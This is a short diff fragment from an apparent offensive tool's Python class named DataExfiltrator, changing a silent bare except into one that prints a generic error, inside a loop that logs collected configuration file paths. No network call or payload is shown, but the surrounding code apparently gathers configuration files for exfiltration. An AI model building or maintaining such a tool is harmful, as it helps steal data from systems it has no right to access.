@@ -594,8 +594,8 @@ class DataExfiltrator:
                                 
                                 log.success(f"[Exfiltrator] Collected: {config_path}")
                     
-                    except:
-                        pass
+                    except Exception as e:
+                        print("Error occurred")
             
             return {
                 "success": len(collected) > 0,
